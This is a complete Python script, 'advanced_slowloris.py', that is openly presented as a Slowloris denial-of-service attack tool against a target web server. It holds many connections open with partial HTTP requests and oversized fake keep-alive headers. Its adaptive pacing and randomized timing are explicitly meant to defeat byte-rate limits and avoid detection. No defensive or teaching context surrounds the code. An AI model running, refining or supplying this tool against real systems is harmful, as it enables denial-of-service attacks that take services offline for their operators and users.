# advanced_slowloris.py

import socket
import threading
import time
import random
import sys
import argparse

# A global threading.Event to signal all worker threads to stop gracefully.
# This is a thread-safe boolean flag.
stop_event = threading.Event()

class AttackState:
    """
    A thread-safe class to hold and update the attack's dynamic settings.
    This allows the main manager thread to communicate changes (like the sleep interval)
    to all the active worker threads.
    """
    def __init__(self, sleep_interval):
        # The current sleep interval that workers should use.
        self.sleep_interval = sleep_interval
        # A lock to prevent race conditions when multiple threads access the sleep_interval.
        self.lock = threading.Lock()

    def get_sleep(self):
        """Safely gets the current sleep interval."""
        with self.lock:
            return self.sleep_interval

    def set_sleep(self, new_interval):
        """Safely updates the sleep interval if it has changed."""
        with self.lock:
            if self.sleep_interval != new_interval:
                print(f"[!] Pace changed: Keep-alive interval now ~{new_interval}s")
                self.sleep_interval = new_interval

class SocketWorker(threading.Thread):
    """
    A dedicated thread to manage the lifecycle of a single socket.
    It creates a connection, sends initial headers, and periodically sends keep-alive data.
    If the socket dies for any reason, the thread simply terminates.
    """
    def __init__(self, target_ip, target_port, header_size, attack_state):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.header_size = header_size
        self.attack_state = attack_state # Use the shared state object
        self.sock = None

    def run(self):
        """The main logic for the worker thread."""
        try:
            # Create and connect the socket
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.target_ip, self.target_port))

            # Send the initial, incomplete HTTP headers
            self.sock.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
            self.sock.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
            self.sock.send(b"Accept-language: en-US,en,q=0.5\r\n")

            # This is the main keep-alive loop for the socket
            while not stop_event.is_set():
                # Bigger Fake Headers: Create a large, bogus header to meet minimum byte-rate rules.
                fake_header = f"X-a: {random.choice('abcdefghijklmnopqrstuvwxyz') * self.header_size}\r\n"
                self.sock.send(fake_header.encode("utf-8"))
                
                # Get the current sleep interval from the shared state object
                current_sleep = self.attack_state.get_sleep()
                
                # Use a randomized sleep time to make the attack less predictable
                lower_bound = max(1, current_sleep - 5)
                random_sleep = random.randint(lower_bound, current_sleep)
                time.sleep(random_sleep)

        except socket.error:
            # If any socket operation fails (e.g., connection reset), the exception is caught
            # and the thread will silently exit. The manager will detect this and replenish it.
            pass
        finally:
            # Ensure the socket is closed when the thread finishes
            if self.sock:
                self.sock.close()

def main():
    """Parses arguments and manages the attack."""
    # Setup command-line argument parsing
    parser = argparse.ArgumentParser(description="Advanced, multi-threaded Slowloris attack script with dynamic pacing.")
    parser.add_argument("hostname", help="The target server's hostname or IP address.")
    parser.add_argument("connections", type=int, help="The number of connections to maintain.")
    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080).")
    parser.add_argument("--header-size", type=int, default=100, help="Size of the bogus keep-alive header value (in bytes).")
    parser.add_argument("--sleep", type=int, default=15, help="Initial maximum time in seconds between sending keep-alive headers.")
    
    args = parser.parse_args()
    
    # Create the shared state object to be passed to all workers
    attack_state = AttackState(args.sleep)

    print(f"Starting adaptive attack on {args.hostname} with {args.connections} connections.")
    
    threads = []
    try:
        # This is the main manager loop
        while not stop_event.is_set():
            # Get an accurate count of currently active connections by pruning dead threads
            num_before_prune = len(threads)
            threads = [t for t in threads if t.is_alive()]
            num_after_prune = len(threads)
            
            dropped_count = num_before_prune - num_after_prune
            
            # --- DYNAMIC PACING LOGIC ---
            # If the server is aggressively dropping our connections (more than 10% of our pool),
            # we decrease the sleep interval to send keep-alives more frequently.
            if dropped_count > (args.connections * 0.1):
                attack_state.set_sleep(max(5, attack_state.get_sleep() - 5))
            # If connections are stable, we can be stealthier by slowly increasing the sleep interval.
            elif dropped_count == 0 and attack_state.get_sleep() < args.sleep:
                attack_state.set_sleep(attack_state.get_sleep() + 1)
            # --------------------------

            # Replenishment: If the number of active threads is below our target, start new ones.
            while len(threads) < args.connections:
                worker = SocketWorker(args.hostname, args.port, args.header_size, attack_state)
                worker.start()
                threads.append(worker)

            # Print a status update every second
            print(f"[*] Active connections: {len(threads)} / {args.connections} | Dropped: {dropped_count} | Pace: ~{attack_state.get_sleep()}s")
            time.sleep(1)

    except KeyboardInterrupt:
        # Graceful shutdown process
        print("\n[!] Attack stopped by user. Shutting down threads...")
        stop_event.set() # Signal all worker threads to stop
        for t in threads:
            t.join() # Wait for each thread to finish its current loop and exit
        print("[*] All threads terminated.")

if __name__ == "__main__":
    main()